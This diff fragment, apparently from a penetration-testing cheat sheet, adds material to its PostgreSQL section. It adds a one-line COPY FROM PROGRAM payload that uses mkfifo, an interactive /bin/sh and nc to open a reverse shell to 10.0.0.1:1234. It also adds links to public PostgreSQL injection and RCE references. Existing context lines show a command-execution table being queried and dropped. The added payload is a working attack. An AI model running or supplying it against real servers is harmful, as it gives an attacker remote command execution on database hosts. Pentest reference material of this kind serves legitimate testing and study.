@@ -2621,6 +2621,15 @@ postgres=# \q                        // quit
 <DATABASE>=# SELECT * FROM cmd_exec;
 <DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
 ```
+```c
+DROP TABLE IF EXISTS shell;CREATE TABLE shell(output text);COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
+```
+```c
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-to-program
+```
+```c
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
+```
 
 #### Redis
 
